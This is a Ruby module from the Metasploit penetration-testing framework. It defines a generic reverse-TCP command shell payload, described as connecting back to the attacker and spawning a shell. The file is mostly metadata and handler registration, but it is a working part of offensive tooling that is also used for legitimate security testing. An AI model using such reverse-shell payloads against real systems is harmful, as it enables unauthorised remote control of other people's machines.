##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/payload/generic'
require 'msf/core/handler/reverse_tcp'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Single
  include Msf::Payload::Generic

  handler module_name: 'Msf::Handler::ReverseTcp'

  def initialize(info = {})
    super(
        Msf::Module::ModuleInfo.merge!(
            info,
            'Name'          => 'Generic Command Shell, Reverse TCP Inline',
            'Description'   => 'Connect back to attacker and spawn a command shell',
            'Author'        => 'skape',
            'License'       => MSF_LICENSE,
            'Session'       => Msf::Sessions::CommandShell
        )
    )
  end

end
